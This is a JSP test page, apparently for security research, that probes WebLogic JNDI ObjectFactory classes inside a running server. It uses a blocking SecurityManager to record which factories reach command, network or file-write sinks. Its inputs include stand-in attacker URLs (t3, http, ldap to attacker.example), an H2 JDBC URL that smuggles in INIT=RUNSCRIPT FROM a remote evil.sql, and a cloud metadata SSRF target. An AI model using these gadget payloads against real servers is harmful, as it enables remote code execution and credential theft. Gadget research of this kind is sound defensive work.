<%@ page import="javax.naming.*,javax.naming.spi.*,java.util.*,java.io.*" %>
<%@ page contentType="text/plain; charset=UTF-8" %>
<%!
    // Sink tracking
    static final Set<String> sinksHit = Collections.synchronizedSet(new LinkedHashSet<String>());
    static volatile String lastDetail = null;

    static void resetSinks() {
        sinksHit.clear();
        lastDetail = null;
    }

    static String runFactoryTest(String label, String factoryClass, String refClass,
                                  String[][] attrs, int timeoutMs) {
        resetSinks();
        long start = System.currentTimeMillis();

        // Load factory
        ObjectFactory factory;
        try {
            Class<?> clz = Class.forName(factoryClass);
            factory = (ObjectFactory) clz.getDeclaredConstructor().newInstance();
        } catch (ClassNotFoundException e) {
            return String.format("[SKIP        ] %-35s  class not found: %s", label, factoryClass);
        } catch (Exception e) {
            return String.format("[SKIP        ] %-35s  init failed: %s: %s",
                    label, e.getClass().getSimpleName(), e.getMessage());
        }

        // Build reference
        Reference ref = new Reference(refClass, new StringRefAddr("dummy", ""),
                                      factoryClass, null);
        for (String[] kv : attrs) {
            ref.add(new StringRefAddr(kv[0], kv[1]));
        }

        final ObjectFactory ff = factory;
        final Reference fr = ref;
        final Object[] result = {null};
        final Throwable[] error = {null};
        final boolean[] done = {false};

        // Install tracking SecurityManager
        SecurityManager oldSm = System.getSecurityManager();
        try {
            System.setSecurityManager(new SecurityManager() {
                public void checkExec(String cmd) {
                    sinksHit.add("cmd_exec");
                    lastDetail = "exec=" + cmd;
                    throw new SecurityException("blocked: exec " + cmd);
                }
                public void checkConnect(String host, int port) {
                    sinksHit.add("network");
                    lastDetail = "connect=" + host + ":" + port;
                    throw new SecurityException("blocked: connect " + host + ":" + port);
                }
                public void checkWrite(String file) {
                    // Skip normal temp/log writes
                    if (file != null && (file.contains("/tmp/") || file.endsWith(".log")
                        || file.endsWith(".lck") || file.contains("domain1"))) return;
                    sinksHit.add("file_write");
                    lastDetail = "write=" + file;
                    throw new SecurityException("blocked: write " + file);
                }
                public void checkRead(String f) {}
                public void checkRead(String f, Object c) {}
                public void checkPermission(java.security.Permission p) {}
                public void checkPermission(java.security.Permission p, Object c) {}
            });
        } catch (Exception smEx) {
            // Can't set SecurityManager — run without sink detection
            // Still useful for checking if factory resolves
        }

        Thread resolveThread = new Thread(new Runnable() {
            public void run() {
                try {
                    result[0] = ff.getObjectInstance(fr, new CompositeName("test"), null, null);
                } catch (Throwable t) {
                    error[0] = t;
                }
                done[0] = true;
            }
        }, "resolve-" + label);
        resolveThread.setDaemon(true);
        resolveThread.start();

        try { resolveThread.join(timeoutMs); } catch (InterruptedException ie) {}

        long elapsed = System.currentTimeMillis() - start;
        boolean timedOut = !done[0];
        if (timedOut) resolveThread.interrupt();

        // Restore SecurityManager
        try { System.setSecurityManager(oldSm); } catch (Exception e) {}

        String status;
        if (!sinksHit.isEmpty()) status = "REAL";
        else if (timedOut) status = "TIMEOUT";
        else if (error[0] != null) status = "ERROR";
        else status = "NO_SINK";

        StringBuilder sb = new StringBuilder();
        sb.append(String.format("[%-12s] %-35s  sinks=%-25s %4dms", status, label, sinksHit.toString(), elapsed));
        if (lastDetail != null) sb.append("  ").append(lastDetail);
        if (error[0] != null && sinksHit.isEmpty()) {
            sb.append("  err=").append(error[0].getClass().getSimpleName());
            String msg = error[0].getMessage();
            if (msg != null && msg.length() > 80) msg = msg.substring(0, 80) + "...";
            sb.append(": ").append(msg);
            Throwable cause = error[0].getCause();
            if (cause != null) {
                sb.append("  cause=").append(cause.getClass().getSimpleName());
            }
        }
        if (result[0] != null && sinksHit.isEmpty()) {
            sb.append("  result=").append(result[0].getClass().getName());
        }
        return sb.toString();
    }
%>
<%
StringBuilder out2 = new StringBuilder();
out2.append("==========================================================================================\n");
out2.append("  WL Factory Re-verification - Inside WebLogic Server\n");
out2.append("  JDK: ").append(System.getProperty("java.version")).append("\n");
out2.append("  WL Home: ").append(System.getProperty("weblogic.home", "unknown")).append("\n");
out2.append("==========================================================================================\n\n");

// --- Group 1: WL URL Context Factories ---
out2.append("-- WL URL Context Factories --\n");

out2.append(runFactoryTest("t3_context_localhost",
    "weblogic.jndi.factories.t3.t3URLContextFactory",
    "javax.naming.Context",
    new String[][]{{"URL", "t3://127.0.0.1:7001"}}, 3000)).append("\n");

out2.append(runFactoryTest("t3_context_attacker",
    "weblogic.jndi.factories.t3.t3URLContextFactory",
    "javax.naming.Context",
    new String[][]{{"URL", "t3://attacker.example:7001"}}, 3000)).append("\n");

out2.append(runFactoryTest("http_context_attacker",
    "weblogic.jndi.factories.http.httpURLContextFactory",
    "javax.naming.Context",
    new String[][]{{"URL", "http://attacker.example:8080/jndi"}}, 3000)).append("\n");

out2.append(runFactoryTest("http_context_metadata",
    "weblogic.jndi.factories.http.httpURLContextFactory",
    "javax.naming.Context",
    new String[][]{{"URL", "http://169.254.169.254/latest/meta-data/"}}, 3000)).append("\n");

out2.append(runFactoryTest("java_context",
    "weblogic.jndi.factories.java.javaURLContextFactory",
    "javax.naming.Context",
    new String[][]{{"URL", "java:comp/env"}}, 2000)).append("\n");

// --- Group 2: WL ObjectFactories ---
out2.append("\n-- WL ObjectFactories --\n");

out2.append(runFactoryTest("mail_session_basic",
    "weblogic.deployment.MailSessionObjectFactory",
    "javax.mail.Session",
    new String[][]{{"mail.smtp.host", "attacker.example"}, {"mail.smtp.port", "25"}}, 3000)).append("\n");

out2.append(runFactoryTest("proxy_ds_h2",
    "weblogic.jdbc.common.internal.ProxyDataSourceManager",
    "javax.sql.DataSource",
    new String[][]{{"url", "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'"},
                   {"driverClassName", "org.h2.Driver"}}, 3000)).append("\n");

out2.append(runFactoryTest("proxy_ds_wl_native",
    "weblogic.jdbc.common.internal.ProxyDataSourceManager",
    "javax.sql.DataSource",
    new String[][]{{"database", "jdbc:hsqldb:http://attacker.example/db"},
                   {"user", "sa"}, {"password", ""}}, 3000)).append("\n");

out2.append(runFactoryTest("url_obj_http",
    "weblogic.application.naming.URLObjectFactory",
    "java.net.URL",
    new String[][]{{"URL", "http://attacker.example/callback"}}, 3000)).append("\n");

out2.append(runFactoryTest("url_obj_ldap",
    "weblogic.application.naming.URLObjectFactory",
    "java.net.URL",
    new String[][]{{"URL", "ldap://attacker.example:389/test"}}, 3000)).append("\n");

// --- Group 3: WL-specific JNDI factories ---
out2.append("\n-- WL-specific Additional Factories --\n");

out2.append(runFactoryTest("wl_datasource_factory",
    "weblogic.jdbc.common.internal.DataSourceFactory",
    "javax.sql.DataSource",
    new String[][]{{"url", "jdbc:hsqldb:http://attacker.example/db"}}, 3000)).append("\n");

out2.append(runFactoryTest("wl_env_factory",
    "weblogic.jndi.factories.java.ReadOnlyContextFactory",
    "javax.naming.Context",
    new String[][]{{"URL", "java:comp/env"}}, 2000)).append("\n");

out2.append("\n==========================================================================================\n");
out2.append("  REAL = sink reached | TIMEOUT = may be SSRF | ERROR = check details | SKIP = no class\n");
out2.append("==========================================================================================\n");

out.print(out2.toString());
%>
